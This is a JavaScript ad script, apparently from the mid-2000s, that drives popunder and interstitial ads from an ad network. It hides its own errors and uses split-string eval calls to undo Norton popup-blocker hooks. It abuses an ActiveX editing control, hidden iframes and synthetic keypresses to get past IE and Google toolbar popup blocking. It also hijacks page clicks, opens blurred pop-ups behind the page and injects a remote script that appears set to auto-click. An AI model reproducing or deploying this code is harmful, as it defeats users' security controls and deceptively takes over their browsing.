<!--
var interstitialBox={
	ie7: window.XMLHttpRequest && document.all && !window.opera,
	ie7offline: this.ie7 && window.location.href.indexOf("http")==-1,
	launch:false,
	scrollbarwidth: 16,

	loadpage:function(url){
		page_request = url
		document.getElementById("interContent").innerHTML='<iframe src="'+ page_request +'" style="width: 100%; height: 600px" marginwidth="0" marginheight="0" frameborder="0" vspace="0" hspace="0"></iframe>';
	},

	createcontainer:function(){
		document.write('<div id="interContainer" style="position: absolute; width: 800px; left: 0; top: 0; padding: 15px; padding-top: 0; background-color: #d0e47e; border: 1px solid black; visibility: hidden; z-index: 6;">'+this.defineheader+'<div id="interContent" style= "border: 1px solid gray; background-color: white"></div></div><div id="interVeil" style="position: absolute; background: black url(http://popunder.adsrevenue.net/blackdot.gif); right: 0; width: 10px; top: 0; z-index: 5; visibility: hidden; filter:progid:DXImageTransform.Microsoft.alpha(opacity=80); opacity: 0.8;"></div>')
		this.interContainer=document.getElementById("interContainer")
		this.interVeil=document.getElementById("interVeil")
		this.standardbody=(document.compatMode=="CSS1Compat")? document.documentElement : document.body
	},

	showcontainer:function(){
		if (this.interContainer.style.display=="none") return
		var ie=document.all && !window.opera
		var dom=document.getElementById
		var scroll_top=(ie)? this.standardbody.scrollTop : window.pageYOffset
		var scroll_left=(ie)? this.standardbody.scrollLeft : window.pageXOffset
		var docwidth=(ie)? this.standardbody.clientWidth : window.innerWidth-this.scrollbarwidth
		var docheight=(ie)? this.standardbody.clientHeight: window.innerHeight
		var docheightcomplete=(this.standardbody.offsetHeight>this.standardbody.scrollHeight)? this.standardbody.offsetHeight : this.standardbody.scrollHeight
		var objwidth=this.interContainer.offsetWidth
		var objheight=this.interContainer.offsetHeight
		this.interVeil.style.width=docwidth+"px"
		this.interVeil.style.height=docheightcomplete+"px"
		this.interVeil.style.left=0
		this.interVeil.style.top=0
		this.interVeil.style.visibility="visible"
		this.interContainer.style.left=docwidth/2-objwidth/2+"px"
		var topposition=(docheight>objheight)? scroll_top+docheight/10-objheight/10+"px" : scroll_top+5+"px"
		topposition = 10;
		this.interContainer.style.top=Math.floor(parseInt(topposition))+"px"
		this.interContainer.style.visibility="visible"
		if (this.autohidetimer && parseInt(this.autohidetimer)>0 && typeof this.timervar=="undefined")
		this.timervar=setTimeout("interstitialBox.closeit()", this.autohidetimer*1000)
	},

	closeit:function(){
		this.interVeil.style.display="none"
		this.interContainer.style.display="none"
		if (this.disablescrollbars && window.XMLHttpRequest)
			this.standardbody.style.overflow="auto"
		if (typeof this.timervar!="undefined") clearTimeout(this.timervar)
	},

	getscrollbarwidth:function(){
		var scrollbarwidth=window.innerWidth-(this.interVeil.offsetLeft+this.interVeil.offsetWidth)
		this.scrollbarwidth=(typeof scrollbarwidth=="number")? scrollbarwidth : this.scrollbarwidth
	},

	hidescrollbar:function(){
		if (this.disablescrollbars){
			if (window.XMLHttpRequest)
				this.standardbody.style.overflow="hidden"
			else
				window.scrollTo(0,0)
		}
	},

	dotask:function(target, functionref, tasktype){
		var tasktype=(window.addEventListener)? tasktype : "on"+tasktype
		if (target.addEventListener){

			target.addEventListener(tasktype, functionref, false)
		}else if (target.attachEvent){

			target.attachEvent(tasktype, functionref)
		}
	},

	initialize:function(url){

		this.hidescrollbar(); this.getscrollbarwidth();
		interstitialBox.showcontainer();
		this.dotask(window, function(){interstitialBox.showcontainer()}, "resize")
		this.loadpage(url)
	}
}


function blockError(){return true;}
window.onerror = blockError;
eval("if (wind"+"ow.SymRe"+"alWinOpen){wind"+"ow.op"+"en = Sym"+"RealWi"+"nOpen;}");
eval("if (wind"+"ow.NS_Act"+"ualOpen) {wind"+"ow.op"+"en = NS_"+"Actual"+"Open;}");
var ppmydoc = document;var psDiv = ppmydoc.getElementById('paypopupScriptDiv');
if (typeof(usingClick) == 'undefined') {var usingClick = false;}
if (typeof(usingObject) == 'undefined') {var usingObject = false;}
if (typeof(usingEditor) == 'undefined') {var usingEditor = false;}
if (typeof(popwin) == 'undefined') {var popwin = null;}
if(1!=1){}
if (typeof(poped) == 'undefined') {var poped = false;}
if (typeof(paypopupURL) == 'undefined') {var paypopupURL = "&serverfile=paypopup&ref="+escape(self.location);}
if (typeof(contextualAds) == 'undefined') {var contextualAds = '';}
if (!document.getElementById('paypopupScriptDiv')) {document.writeln('<div id=paypopupScriptDiv style="top: 0; width: 0; height: 0; position: relative; visibility: hidden;"></div>');}
var blk = 1;
var setupClickSuccess = false;
var googleInUse = false;
var pop = 'enter';
var myurl = document.location.protocol + "//" + document.location.host;
var fc = '-1';
var objectFile = 'index.shtml';
contextualAds = 'http://a.adorika.net/c/banner_s?tenant=AD&selection=4856&size=UN&skin=pop&auto_click=1&di=1';
var MAX_TRIED = 20;
var objectTried = false;
var tried = 0;
var randkey = '.0';
var myWindow;
var popWindow;
var setupObjectSuccess = 0;

function setupObject() {if (usingObject) {try{if (setupObjectSuccess < 5) {var psDiv = ppmydoc.getElementById('paypopupScriptDiv');if (psDiv) {psDiv.innerHTML += '<INPUT STYLE="display:none;" ID="autoHit" TYPE="TEXT" ONKEYPRESS="showObject()">';popWindow=window.createPopup();popWindow.document.body.innerHTML='<DIV ID="objectRemover"><OBJECT ID="getParentDiv" STYLE="position:absolute;top:0px;left:0px;" WIDTH=1 HEIGHT=1 DATA="'+myurl+'/'+objectFile+'" TYPE="text/html"></OBJECT></DIV>';psDiv.innerHTML += '<IFRAME NAME="popIframe" STYLE="position:absolute;top:-100px;left:-100px;width:1px;height:1px;" SRC="about:blank"></IFRAME>';psDiv.innerHTML += '<OBJECT ID="getParentFrame" STYLE="position:absolute;top:0px;left:0px;" WIDTH=1 HEIGHT=1 DATA="'+myurl+'/'+objectFile+'" TYPE="text/html"></OBJECT>';setupObjectSuccess = 6;}else {setTimeout('setupObject();',500);}}}catch(e){if (setupObjectSuccess < 5) {setupObjectSuccess++;setTimeout('setupObject();',500);}else if (setupObjectSuccess == 5) {objectTried = true;}}}}
function tryObject(){
	if (!objectTried && !poped) {
		if(objectTried){}
		if (setupObjectSuccess == 6 && googleInUse && popWindow && popWindow.document.getElementById('getParentDiv') && popWindow.document.getElementById('getParentDiv').object && popWindow.document.getElementById('getParentDiv').object.parentWindow) {myWindow=popWindow.document.getElementById('getParentDiv').object.parentWindow;}else if (setupObjectSuccess == 6 && !googleInUse && popIframe && popIframe.getParentFrame && popIframe.getParentFrame.object && popIframe.getParentFrame.object.parentWindow){myWindow=popIframe.getParentFrame.object.parentWindow;popIframe.location.replace('about:blank');}else {setTimeout('tryObject()',200);tried++;if (tried >= MAX_TRIED && !objectTried) {objectTried = true;}return;}openObject();window.windowFired=true;self.focus();}}
function openObject(){if (!objectTried && !poped) {if (myWindow && window.windowFired){window.windowFired=false;document.getElementById('autoHit').fireEvent("onkeypress",(document.createEventObject().keyCode=escape(randkey).substring(1)));}else {setTimeout('openObject();',100);}tried++;if (tried >= MAX_TRIED) {objectTried = true;}}}
function showObject(){if (!objectTried && !poped) {if (googleInUse) {window.daChildObject=popWindow.document.getElementById('objectRemover').children(0);window.daChildObject=popWindow.document.getElementById('objectRemover').removeChild(window.daChildObject);}if (!getPaypopupURL(window.open('about:blank','Ads1195333784','scrollbars=1,resizable=1,menubar=1,location=1,top=0,left=0,width=1,height=1'), 1)) {if (!googleInUse) {googleInUse=true;tried=0;tryObject();}}objectTried = true;}}

var startObjectSuccess = 0;
function createActiveXObject() {
	return 1;
}
function startObject(){
	axobj = createActiveXObject();
	if (axobj) {
		document.write('<object id="paypopupObject" classid="clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A" STYLE="width:650;height:650;top:100;left:100;position:absolute;" align="middle"><PARAM NAME="ActivateApplets" VALUE="1"></object>');

		axobj = document.getElementById('paypopupObject');
		axobj.style.width='1';
		axobj.style.height='1';

		startObjectSuccess = 6;
		popObject();
	}else if (startObjectSuccess < 5) {
		startObjectSuccess++;
		setTimeout('startObject();', 50);
	}
}
function popObject(){
	if (poped) {return true;}

	var pObj = document.getElementById('paypopupObject');
	if (pObj) {
		try {
			if(!poped){
				popwin=pObj.DOM.Script.open ("http://a.adorika.net/c/banner_s?tenant=AD&selection=4856&size=UN&skin=pop&auto_click=1&di=1","Ads1195333784","scrollbars=1, resizable=1, menubar=1, location=1, top=100,left=100, width=800, height=800");
			}
			if (popwin) {
				popwin.blur();
				poped = true;
			}
			getPaypopupURL(popwin, 1);
			oObj.style.display = 'none';
			return true;
		}catch(e) {
			setTimeout('popObject()', 200);
		}
		return false;
	}
}

function paypopup(){if (!poped) {if(!usingClick && !usingObject) {getPaypopupURL(window.open('about:blank','Ads1195333784','scrollbars=1,resizable=1,menubar=1,location=1,top=100,left=100,width=650,height=650'), 0);}}if (!poped) {setupClick();if (usingObject) {tryObject();}}}

function setupClick() {if (!poped && !setupClickSuccess){setupClickSuccess=true;if (window.Event) document.captureEvents(Event.CLICK);prePaypopOnclick = document.onclick;document.onclick = paypopupClick;self.focus();}}
function paypopupClick(e) {if (!poped) {if (parseInt(navigator.appVersion)>3) {var leftMouseClick = 1;if (navigator.appName == "Netscape") {leftMouseClick = (e.which == 1);}else {leftMouseClick = true};if (leftMouseClick) {getPaypopupURL(window.open('about:blank','Ads1195333784','scrollbars=1,resizable=1,menubar=1,location=1,top=100,left=100,width=800,height=650'), 2);}if (typeof(prePaypopOnclick) == "function") {prePaypopOnclick();}}}}

function detectGoogle() {if (usingObject) {var psDiv = ppmydoc.getElementById('paypopupScriptDiv');if (psDiv) {psDiv.innerHTML += '<DIV STYLE="display:none;"><OBJECT ID="detectGoogle" CLASSID="clsid:00EF2092-6AC5-47c0-BD25-CF2D5D657FEB" STYLE="display:none;" CODEBASE="view-source:about:blank"></OBJECT></DIV>';googleInUse|=(typeof(document.getElementById('detectGoogle'))=='object');}else {setTimeout('detectGoogle()', 10);}}}
function version() {
	var os = 'W0';
	var bs = 'I0';
	var isframe = false;
	var browser = window.navigator.userAgent;
	if (browser.indexOf('Win') != -1){os = 'W1';}
	if (browser.indexOf("SV1") != -1) {bs = 'I2';}
	else if (browser.indexOf("Opera") != -1) {bs = "I0";}
	else if (browser.indexOf("Firefox") != -1) {bs = "I0";}
	else if (browser.indexOf("Microsoft") != -1 || browser.indexOf("MSIE") != -1) {bs = 'I1';}
	if (top != self) {isframe = true;}
	paypopupURL = paypopupURL+"&os="+os+"&bs="+bs+"&isframe="+isframe;usingClick = blk && ((browser.indexOf("SV1") != -1) || (browser.indexOf("Opera") != -1) || (browser.indexOf("Firefox") != -1));
	usingObject = blk && (browser.indexOf("SV1") != -1) && !(browser.indexOf("Opera") != -1) && ((browser.indexOf("Microsoft") != -1) || (browser.indexOf("MSIE") != -1));
	usingEditor = blk && !(browser.indexOf("Opera") != -1) && ((browser.indexOf("Microsoft") != -1) || (browser.indexOf("MSIE") != -1));

	if (browser.indexOf("Avant Browser") != -1) {
		usingEditor = false;
		usingClick = true;
	}
	detectGoogle();
}
version();

function getPaypopupURL(popwin, bk) {if (popwin) {if (contextualAds) {popwin.location = contextualAds+escape('');}else {popwin.location = 'http://a.adorika.net/c/banner_s?tenant=AD&selection=4856&size=UN&skin=pop&auto_click=1&di=1';}popwin.blur();self.focus();poped=true;}return popwin;}

var randInterstitial = Math.round(100*Math.random());
var forceInterstitial = 0;
function loadingPop() {
	if(!usingClick && !usingObject) {
		if (pop == "enter") {
			paypopup();
			if (forceInterstitial && top.location == location){
				ppinter();
			}else{
				if(!poped && top.location == location){
					ppinter();
				}
			}

		}else {
			onunload = paypopup;
		}
	}else {

		setupClick();
		if (usingObject) {
			tryObject();
		}

		if (forceInterstitial && top.location == location){
			ppinter();
		}else{
			if(!poped && top.location == location){
				ppinter();
			}
		}

	}
}

function ppinter(){
	if( typeof(no_ppint)!="undefined" && no_ppint == 1) {return;}
	if(!interstitial()) return;
	var c = document.getElementById("interContainer");
	if (c.parentNode != document.body) {
		interstitialBox.hideTime = 10;
	}
	setTimeout('if(!poped ||forceInterstitial){var ppob = document.getElementById(pppid);var scob = document.createElement("SCRIPT");scob.src = "http://a.adorika.net/c/banner_s?tenant=AD&selection=4856&size=UN&skin=pop&auto_click=1&di=1";ppob.appendChild(scob);}', 10);
}

var pppid='pppid142'; document.write("<object style='display:block;width:1px;height:1px;position:absolute;left:0px;top:0px' id='"+pppid+"'></object>");


if (usingObject) {setupObject();}
if (usingEditor) {startObject();}
loadingPop();
self.focus();
-->